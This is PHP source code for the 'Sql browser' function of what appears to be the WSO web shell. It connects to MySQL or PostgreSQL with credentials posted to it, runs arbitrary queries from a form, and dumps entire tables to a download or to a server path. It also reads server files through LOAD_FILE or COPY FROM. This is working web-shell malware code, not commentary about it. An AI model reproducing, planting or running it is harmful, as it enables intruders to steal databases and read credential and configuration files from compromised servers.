<?php
function actionSql() {
	class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this->type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this->type)	{
				case 'mysql':
					if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this->type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this->type) {
				case 'mysql':
					return $this->res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this->res = @pg_query($this->link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this->res;
			switch($this->type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this->type)	{
				case 'mysql':
                        return $this->query("SHOW databases");
				break;
				case 'pgsql':
					return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
				break;
			}
			return false;
		}
		function listTables() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = $this->query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
				break;
			}
			return false;
		}
		function error() {
			switch($this->type)	{
				case 'mysql':
					return @mysql_error();
				break;
				case 'pgsql':
					return @pg_last_error();
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this->type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this->link);
					else
						$this->query('SET CHARSET '.$str);
					break;
				case 'pgsql':
					return @pg_set_client_encoding($this->link, $str);
					break;
			}
			return false;
		}
		function loadFile($str) {
			switch($this->type)	{
				case 'mysql':
					return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
				break;
				case 'pgsql':
					$this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;");
					$r=array();
					while($i=$this->fetch())
						$r[] = $i['file'];
					$this->query('drop table wso2');
					return array('file'=>implode("\n",$r));
				break;
			}
			return false;
		}
		function dump($table, $fp = false) {
			switch($this->type)	{
				case 'mysql':
					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					$sql = $create[1].";\n";
                    if($fp) fwrite($fp, $sql); else echo($sql);
					$this->query('SELECT * FROM `'.$table.'`');
                    $i = 0;
                    $head = true;
					while($item = $this->fetch()) {
                        $sql = '';
                        if($i % 1000 == 0) {
                            $head = true;
                            $sql = ";\n\n";
                        }

						$columns = array();
						foreach($item as $k=>$v) {
                            if($v === null)
                                $item[$k] = "NULL";
                            elseif(is_int($v))
                                $item[$k] = $v;
                            else
                                $item[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
                            $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
                            $head = false;
                        } else
                            $sql .= "\n\t,(".implode(", ", $item).')';
                        if($fp) fwrite($fp, $sql); else echo($sql);
                        $i++;
					}
                    if(!$head)
                        if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
				break;
				case 'pgsql':
					$this->query('SELECT * FROM '.$table);
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
							$item[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
			return false;
		}
	};
	$db = new DbClass($_POST['type']);
	if((@$_POST['p2']=='download') && (@$_POST['p1']!='select')) {
		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db->selectdb($_POST['sql_base']);
        switch($_POST['charset']) {
            case "Windows-1251": $db->setCharset('cp1251'); break;
            case "UTF-8": $db->setCharset('utf8'); break;
            case "KOI8-R": $db->setCharset('koi8r'); break;
            case "KOI8-U": $db->setCharset('koi8u'); break;
            case "cp866": $db->setCharset('cp866'); break;
        }
        if(empty($_POST['file'])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=dump.sql");
            header("Content-Type: text/plain");
            foreach($_POST['tbl'] as $v)
				$db->dump($v);
            exit;
        } elseif($fp = @fopen($_POST['file'], 'w')) {
            foreach($_POST['tbl'] as $v)
                $db->dump($v, $fp);
            fclose($fp);
            unset($_POST['p2']);
        } else
            die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
	}
	wsoHeader();
	echo "
<h1>Sql browser</h1><div class=content>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
<td><select name='type'><option value='mysql' ";
    if(@$_POST['type']=='mysql')echo 'selected';
echo ">MySql</option><option value='pgsql' ";
if(@$_POST['type']=='pgsql')echo 'selected';
echo ">PostgreSql</option></select></td>
<td><input type=text name=sql_host value=\"". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."\"></td>
<td><input type=text name=sql_login value=\"". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."\"></td>
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\"></td><td>";
	$tmp = "<input type=text name=sql_base value=''>";
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db->setCharset('cp1251'); break;
				case "UTF-8": $db->setCharset('utf8'); break;
				case "KOI8-R": $db->setCharset('koi8r'); break;
				case "KOI8-U": $db->setCharset('koi8u'); break;
				case "cp866": $db->setCharset('cp866'); break;
			}
			$db->listDbs();
			echo "<select name=sql_base><option value=''></option>";
			while($item = $db->fetch()) {
				list($key, $value) = each($item);
				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
			}
			echo '</select>';
		}
		else echo $tmp;
	}else
		echo $tmp;
	echo "</td>
				<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td>
			</tr>
		</table>
		<script>
            s_db='".@addslashes($_POST['sql_base'])."';
            function fs(f) {
                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                    if(f.p1) f.p1.value='';
                    if(f.p2) f.p2.value='';
                    if(f.p3) f.p3.value='';
                }
            }
			function st(t,l) {
				d.sf.p1.value = 'select';
				d.sf.p2.value = t;
                if(l && d.sf.p3) d.sf.p3.value = l;
				d.sf.submit();
			}
			function is() {
				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
			}
		</script>";
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
				$tbls_res = $db->listTables();
				while($item = $db->fetch($tbls_res)) {
					list($key, $value) = each($item);
                    if(!empty($_POST['sql_count']))
                        $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";
				}
				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
                    $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
					$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
					$num = $db->fetch();
					$pages = ceil($num['n'] / 30);
                    echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
                    echo " of $pages";
                    if($_POST['p3'] > 1)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>";
                    if($_POST['p3'] < $pages)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>";
                    $_POST['p3']--;
					if($_POST['type']=='pgsql')
						$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "<br><br>";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					$db->query(@$_POST['p2']);
					if($db->res !== false) {
						$title = false;
						echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
						$line = 1;
						while($item = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
								foreach($item as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($item);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							}
							echo '<tr class="l'.$line.'">';
							$line = $line==1?2:1;
							foreach($item as $key => $value) {
								if($value == null)
									echo '<td><i>null</i></td>';
								else
									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
							}
							echo '</tr>';
						}
						echo '</table>';
					} else {
						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
					}
				}
				echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
                if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))
                    echo htmlspecialchars($_POST['p2']);
                echo "</textarea><br/><input type=submit value='Execute'>";
				echo "</td></tr>";
			}
			echo "</table></form><br/>";
            if($_POST['type']=='mysql') {
                $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                if($db->fetch())
                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
            }
			if(@$_POST['p1'] == 'loadfile') {
				$file = $db->loadFile($_POST['p2']);
				echo '<br/><pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
			}
	} else {
        echo htmlspecialchars($db->error());
    }
	echo '</div>';
	wsoFooter();
}